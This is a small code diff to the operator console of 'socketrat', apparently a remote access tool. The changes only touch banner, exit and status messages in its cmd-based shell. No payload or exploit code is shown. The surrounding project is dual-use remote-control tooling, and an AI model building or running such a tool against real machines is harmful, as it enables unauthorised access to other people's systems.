@@ -88,6 +88,7 @@ class ThreadingRATServer(socketserver.ThreadingMixIn, RATServer):
 
 
 class RATServerCmd(cmd.Cmd):
+    intro = 'Welcome to the socketrat shell. Type help or ? to list commands.\n'
     prompt = '(socketrat) '
     ruler = '-'
     nohelp = '*** {}'.format(Style.BRIGHT + Fore.RED + 'No help on %s' + Style.RESET_ALL)
@@ -160,6 +161,7 @@ class RATServerCmd(cmd.Cmd):
 
     def do_exit(self, line):
         '''Exit the shell.'''
+        print('Thank you for using socketrat')
         return True
 
     def do_interact(self, line):
@@ -211,14 +213,16 @@ if __name__ == '__main__':
         t = threading.Thread(target=server.serve_forever)
         t.daemon = True
         t.start()
+        print('Serving on {} port {} ...'.format(host, port))
 
         sh = RATServerCmd(server)
-        intro = 'Serving on {} port {} ...\n'.format(host, port)
-        intro += 'Type help or ? to list commands.\n'
+        #intro = 'Serving on {} port {} ...\n'.format(host, port)
+        #intro += 'Welcome to the socketrat shell. Type help or ? to list commands.\n'
         #sh.cmdqueue.append('help')
         try:
-            sh.cmdloop(intro=intro)
+            #sh.cmdloop(intro=intro)
+            sh.cmdloop()
         finally:
-            print('exiting, stopping server.')
+            print('Stopping server ...')
             server.shutdown()
 
